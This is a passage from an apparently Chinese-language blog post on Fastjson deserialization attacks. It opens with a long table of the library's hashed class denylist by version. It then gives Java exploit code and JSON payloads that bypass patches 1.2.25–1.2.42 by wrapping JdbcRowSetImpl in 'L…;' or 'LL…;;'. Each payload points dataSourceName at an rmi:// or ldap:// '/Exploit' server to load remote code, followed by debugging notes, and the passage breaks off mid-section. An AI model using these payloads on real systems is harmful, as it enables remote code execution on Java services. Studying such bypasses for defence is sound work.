title="目前的列表"></a>目前的列表</h3><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td>oracle.net.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td>jdk.internal.</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td>java.lang.UNIXProcess</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td>org.codehaus.jackson.</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td>org.apache.commons.proxy.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr><tr><td>1.2.66</td><td>-2439930098895578154</td><td>0xde23a0809a8b9bd6L</td><td>javax.script.</td></tr><tr><td>1.2.66</td><td>-582813228520337988</td><td>0xf7e96e74dfa58dbcL</td><td>javax.sound.</td></tr><tr><td>1.2.66</td><td>-26639035867733124</td><td>0xffa15bf021f1e37cL</td><td>javax.print.</td></tr><tr><td>1.2.66</td><td>386461436234701831</td><td>0x55cfca0f2281c07L</td><td>javax.activation.</td></tr><tr><td>1.2.66</td><td>1153291637701043748</td><td>0x100150a253996624L</td><td>javax.tools.</td></tr><tr><td>1.2.66</td><td>1698504441317515818L</td><td>0x17924cca5227622aL</td><td>javax.management.</td></tr><tr><td>1.2.66</td><td>7375862386996623731L</td><td>0x665c53c311193973L</td><td>org.apache.xbean.</td></tr><tr><td>1.2.66</td><td>7658177784286215602L</td><td>0x6a47501ebb2afdb2L</td><td>org.eclipse.jetty.</td></tr><tr><td>1.2.66</td><td>8055461369741094911L</td><td>0x6fcabf6fa54cafffL</td><td>javax.naming.</td></tr><tr><td>1.2.67</td><td>-7775351613326101303L</td><td>0x941866e73beff4c9L</td><td>org.apache.shiro.realm.</td></tr><tr><td>1.2.67</td><td>-6025144546313590215L</td><td>0xac6262f52c98aa39L</td><td>org.apache.http.conn.</td></tr><tr><td>1.2.67</td><td>-5939269048541779808L</td><td>0xad937a449831e8a0L</td><td>org.quartz.</td></tr><tr><td>1.2.67</td><td>-5885964883385605994L</td><td>0xae50da1fad60a096L</td><td>com.taobao.eagleeye.wrapper</td></tr><tr><td>1.2.67</td><td>-3975378478825053783L</td><td>0xc8d49e5601e661a9L</td><td>org.apache.http.impl.</td></tr><tr><td>1.2.67</td><td>-2378990704010641148L</td><td>0xdefc208f237d4104L</td><td>com.ibatis.</td></tr><tr><td>1.2.67</td><td>-905177026366752536L</td><td>0xf3702a4a5490b8e8L</td><td>org.apache.catalina.</td></tr><tr><td>1.2.67</td><td>2660670623866180977L</td><td>0x24ec99d5e7dc5571L</td><td>org.apache.http.auth.</td></tr><tr><td>1.2.67</td><td>2731823439467737506L</td><td>0x25e962f1c28f71a2L</td><td>br.com.anteros.</td></tr><tr><td>1.2.67</td><td>3637939656440441093L</td><td>0x327c8ed7c8706905L</td><td>com.caucho.</td></tr><tr><td>1.2.67</td><td>4254584350247334433L</td><td>0x3b0b51ecbf6db221L</td><td>org.apache.http.cookie.</td></tr><tr><td>1.2.67</td><td>5274044858141538265L</td><td>0x49312bdafb0077d9L</td><td>org.javasimon.</td></tr><tr><td>1.2.67</td><td>5474268165959054640L</td><td>0x4bf881e49d37f530L</td><td>org.apache.cocoon.</td></tr><tr><td>1.2.67</td><td>5596129856135573697L</td><td>0x4da972745feb30c1L</td><td>org.apache.activemq.jms.pool.</td></tr><tr><td>1.2.67</td><td>6854854816081053523L</td><td>0x5f215622fb630753L</td><td>org.mortbay.jetty.</td></tr><tr><td>1.2.68</td><td>-3077205613010077203L</td><td>0xd54b91cc77b239edL</td><td>org.apache.shiro.jndi.</td></tr><tr><td>1.2.68</td><td>-2825378362173150292L</td><td>0xd8ca3d595e982bacL</td><td>org.apache.ignite.cache.jta.</td></tr><tr><td>1.2.68</td><td>2078113382421334967L</td><td>0x1cd6f11c6a358bb7L</td><td>javax.swing.J</td></tr><tr><td>1.2.68</td><td>6007332606592876737L</td><td>0x535e552d6f9700c1L</td><td>org.aoju.bus.proxy.provider.</td></tr><tr><td>1.2.68</td><td>9140390920032557669L</td><td>0x7ed9311d28bf1a65L</td><td>java.awt.p</td></tr><tr><td>1.2.68</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.69</td><td>-8024746738719829346L</td><td>0x90a25f5baa21529eL</td><td>java.io.Serializable</td></tr><tr><td>1.2.69</td><td>-5811778396720452501L</td><td>0xaf586a571e302c6bL</td><td>java.io.Closeable</td></tr><tr><td>1.2.69</td><td>-3053747177772160511L</td><td>0xd59ee91f0b09ea01L</td><td>oracle.jms.AQ</td></tr><tr><td>1.2.69</td><td>-2114196234051346931L</td><td>0xe2a8ddba03e69e0dL</td><td>java.util.Collection</td></tr><tr><td>1.2.69</td><td>-2027296626235911549L</td><td>0xe3dd9875a2dc5283L</td><td>java.lang.Iterable</td></tr><tr><td>1.2.69</td><td>-2939497380989775398L</td><td>0xd734ceb4c3e9d1daL</td><td>java.lang.Object</td></tr><tr><td>1.2.69</td><td>-1368967840069965882L</td><td>0xed007300a7b227c6L</td><td>java.lang.AutoCloseable</td></tr><tr><td>1.2.69</td><td>2980334044947851925L</td><td>0x295c4605fd1eaa95L</td><td>java.lang.Readable</td></tr><tr><td>1.2.69</td><td>3247277300971823414L</td><td>0x2d10a5801b9d6136L</td><td>java.lang.Cloneable</td></tr><tr><td>1.2.69</td><td>5183404141909004468L</td><td>0x47ef269aadc650b4L</td><td>java.lang.Runnable</td></tr><tr><td>1.2.69</td><td>7222019943667248779L</td><td>0x6439c4dff712ae8bL</td><td>java.util.EventListener</td></tr><tr><td>1.2.70</td><td>-5076846148177416215L</td><td>0xb98b6b5396932fe9L</td><td>org.apache.commons.collections4.Transformer</td></tr><tr><td>1.2.70</td><td>-4703320437989596122L</td><td>0xbeba72fb1ccba426L</td><td>org.apache.commons.collections4.functors</td></tr><tr><td>1.2.70</td><td>-4314457471973557243L</td><td>0xc41ff7c9c87c7c05L</td><td>org.jdom2.transform.</td></tr><tr><td>1.2.70</td><td>-2533039401923731906L</td><td>0xdcd8d615a6449e3eL</td><td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td></tr><tr><td>1.2.70</td><td>156405680656087946L</td><td>0x22baa234c5bfb8aL</td><td>com.p6spy.engine.</td></tr><tr><td>1.2.70</td><td>1214780596910349029L</td><td>0x10dbc48446e0dae5L</td><td>org.apache.activemq.pool.</td></tr><tr><td>1.2.70</td><td>3085473968517218653L</td><td>0x2ad1ce3a112f015dL</td><td>org.apache.aries.transaction.</td></tr><tr><td>1.2.70</td><td>3129395579983849527L</td><td>0x2b6dd8b3229d6837L</td><td>org.apache.activemq.ActiveMQConnectionFactory</td></tr><tr><td>1.2.70</td><td>4241163808635564644L</td><td>0x3adba40367f73264L</td><td>org.apache.activemq.spring.</td></tr><tr><td>1.2.70</td><td>7240293012336844478L</td><td>0x647ab0224e149ebeL</td><td>org.apache.activemq.ActiveMQXAConnectionFactory</td></tr><tr><td>1.2.70</td><td>7347653049056829645L</td><td>0x65f81b84c1d920cdL</td><td>org.apache.commons.jelly.</td></tr><tr><td>1.2.70</td><td>7617522210483516279L</td><td>0x69b6e0175084b377L</td><td>org.apache.axis2.transport.jms.</td></tr><tr><td>1.2.71</td><td>-4537258998789938600L</td><td>0xc1086afae32e6258L</td><td>java.io.FileReader</td></tr><tr><td>1.2.71</td><td>-4150995715611818742L</td><td>0xc664b363baca050aL</td><td>java.io.ObjectInputStream</td></tr><tr><td>1.2.71</td><td>-2995060141064716555L</td><td>0xd66f68ab92e7fef5L</td><td>java.io.FileInputStream</td></tr><tr><td>1.2.71</td><td>-965955008570215305L</td><td>0xf2983d099d29b477L</td><td>java.io.ObjectOutputStream</td></tr><tr><td>1.2.71</td><td>-219577392946377768L</td><td>0xfcf3e78644b98bd8L</td><td>java.io.DataOutputStream</td></tr><tr><td>1.2.71</td><td>2622551729063269307L</td><td>x24652ce717e713bbL</td><td>java.io.PrintWriter</td></tr><tr><td>1.2.71</td><td>2930861374593775110L</td><td>0x28ac82e44e933606L</td><td>java.io.Buffered</td></tr><tr><td>1.2.71</td><td>4000049462512838776L</td><td>0x378307cb0111e878L</td><td>java.io.InputStreamReader</td></tr><tr><td>1.2.71</td><td>4193204392725694463L</td><td>0x3a31412dbb05c7ffL</td><td>java.io.OutputStreamWriter</td></tr><tr><td>1.2.71</td><td>5545425291794704408L</td><td>0x4cf54eec05e3e818L</td><td>java.io.FileWriter</td></tr><tr><td>1.2.71</td><td>6584624952928234050L</td><td>0x5b6149820275ea42L</td><td>java.io.FileOutputStream</td></tr><tr><td>1.2.71</td><td>7045245923763966215L</td><td>0x61c5bdd721385107L</td><td>java.io.DataInputStream</td></tr><tr><td>1.2.83</td><td>-8754006975464705441L</td><td>0x868385095a22725fL</td><td>org.apache.commons.io.</td></tr><tr><td>1.2.83</td><td>-8382625455832334425L</td><td>0x8baaee8f9bf77fa7L</td><td>org.mvel2.</td></tr><tr><td>1.2.83</td><td>-6088208984980396913L</td><td>0xab82562f53e6e48fL</td><td>kotlin.reflect.</td></tr><tr><td>1.2.83</td><td>-4733542790109620528L</td><td>0xbe4f13e96a6796d0L</td><td>com.googlecode.aviator.</td></tr><tr><td>1.2.83</td><td>-1363634950764737555L</td><td>0xed13653cb45c4bedL</td><td>org.aspectj.</td></tr><tr><td>1.2.83</td><td>-803541446955902575L</td><td>0xf4d93f4fb3e3d991L</td><td>org.dom4j.</td></tr><tr><td>1.2.83</td><td>860052378298585747L</td><td>0xbef8514d0b79293L</td><td>org.apache.commons.cli.</td></tr><tr><td>1.2.83</td><td>1268707909007641340L</td><td>0x119b5b1f10210afcL</td><td>com.google.common.eventbus.</td></tr><tr><td>1.2.83</td><td>3058452313624178956L</td><td>0x2a71ce2cc40a710cL</td><td>org.thymeleaf.</td></tr><tr><td>1.2.83</td><td>3740226159580918099L</td><td>0x33e7f3e02571b153L</td><td>org.junit.</td></tr><tr><td>1.2.83</td><td>3977090344859527316L</td><td>0x37317698dcfce894L</td><td>org.mockito.asm.</td></tr><tr><td>1.2.83</td><td>4319304524795015394L</td><td>0x3bf14094a524f0e2L</td><td>com.google.common.io.</td></tr><tr><td>1.2.83</td><td>5120543992130540564L</td><td>0x470fd3a18bb39414L</td><td>org.mockito.runners.</td></tr><tr><td>1.2.83</td><td>5916409771425455946L</td><td>0x521b4f573376df4aL</td><td>org.mockito.cglib.</td></tr><tr><td>1.2.83</td><td>6090377589998869205L</td><td>0x54855e265fe1dad5L</td><td>com.google.common.reflect.</td></tr><tr><td>1.2.83</td><td>7164889056054194741L</td><td>0x636ecca2a131b235L</td><td>org.mockito.stubbing.</td></tr><tr><td>1.2.83</td><td>8711531061028787095L</td><td>0x78e5935826671397L</td><td>org.apache.commons.codec.</td></tr><tr><td>1.2.83</td><td>8735538376409180149L</td><td>0x793addded7a967f5L</td><td>ognl.</td></tr><tr><td>1.2.83</td><td>8861402923078831179L</td><td>0x7afa070241b8cc4bL</td><td>com.google.common.util.concurrent.</td></tr><tr><td>1.2.83</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.83</td><td>9144212112462101475L</td><td>0x7ee6c477da20bbe3L</td><td>com.google.common.net.</td></tr></tbody></table><h3 id="目前未知的列表"><a href="#目前未知的列表" class="headerlink" title="目前未知的列表"></a>目前未知的列表</h3><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td>1.2.67</td><td>-831789045734283466L</td><td>0xf474e44518f26736L</td><td></td></tr><tr><td>1.2.71</td><td>3452379460455804429L</td><td>0x2fe950d3ea52ae0dL</td><td></td></tr><tr><td>1.2.78</td><td>-8614556368991373401L</td><td>0x8872f29fd0b0b7a7L</td><td></td></tr><tr><td>1.2.78</td><td>-5472097725414717105L</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td>1.2.78</td><td>-3750763034362895579L</td><td>0xcbf29ce484222325L</td><td></td></tr><tr><td>1.2.78</td><td>-1800035667138631116L</td><td>0xe704fd19052b2a34L</td><td></td></tr><tr><td>1.2.78</td><td>-831789045734283466L</td><td>0xf474e44518f26736L</td><td></td></tr><tr><td>1.2.78</td><td>33238344207745342L</td><td>0x761619136cc13eL</td><td></td></tr><tr><td>1.2.78</td><td>3452379460455804429L</td><td>0x2fe950d3ea52ae0dL</td><td></td></tr><tr><td>1.2.78</td><td>4215053018660518963L</td><td>0x3a7ee0635eb2bc33L</td><td></td></tr><tr><td>1.2.83</td><td>-8614556368991373401L</td><td>0x8872f29fd0b0b7a7L</td><td></td></tr><tr><td>1.2.83</td><td>-3750763034362895579L</td><td>0xcbf29ce484222325L</td><td></td></tr><tr><td>1.2.83</td><td>-1800035667138631116L</td><td>0xe704fd19052b2a34L</td><td></td></tr><tr><td>1.2.83</td><td>4215053018660518963L</td><td>0x3a7ee0635eb2bc33L</td><td></td></tr></tbody></table><h2 id="1-2-25-1-2-41-补丁绕过（需要开启AutoType）"><a href="#1-2-25-1-2-41-补丁绕过（需要开启AutoType）" class="headerlink" title="1.2.25 - 1.2.41 补丁绕过（需要开启AutoType）"></a>1.2.25 - 1.2.41 补丁绕过（需要开启AutoType）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <br><span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br>&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>, <br><span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>很显然与之前的payload相比，<code>com.sun.rowset.JdbcRowSetImpl</code>类名的前面加了<code>L</code>、后面加了<code>;</code>就绕过了黑名单过滤。很明显在TypeUtils#loadClass函数中，如果className以<code>L</code>开头，分号<code>；</code>结尾，就会去掉<code>L</code>和<code>；</code>，然后在加载。条件时只有开启了<code>autoType</code>或者<code>expectClass</code>不为空也就是指定了<code>Class</code>对象时才会调用<code>TypeUtils.loadClass</code>加载，否则<code>fastjson</code>会默认禁止加载该类。</p><p><img src="/../../pict/image-20240619035219066.png" alt="image-20240619035219066"></p><h2 id="1-2-25-1-2-42-补丁绕过（需要开启AutoType）"><a href="#1-2-25-1-2-42-补丁绕过（需要开启AutoType）" class="headerlink" title="1.2.25-1.2.42 补丁绕过（需要开启AutoType）"></a>1.2.25-1.2.42 补丁绕过（需要开启AutoType）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <br><span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br>&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>, <br><span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="调试-1"><a href="#调试-1" class="headerlink" 